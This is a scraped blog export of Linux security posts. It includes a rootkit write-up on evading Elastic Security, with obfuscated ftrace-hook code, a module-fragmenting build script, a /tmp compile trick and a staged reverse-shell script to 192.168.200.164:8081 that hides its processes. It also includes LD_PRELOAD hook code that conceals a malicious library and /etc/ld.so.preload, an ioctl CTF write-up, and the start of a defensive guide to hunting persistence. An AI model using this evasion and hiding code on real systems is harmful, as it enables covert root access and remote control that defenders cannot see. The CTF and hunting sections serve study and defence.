fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious 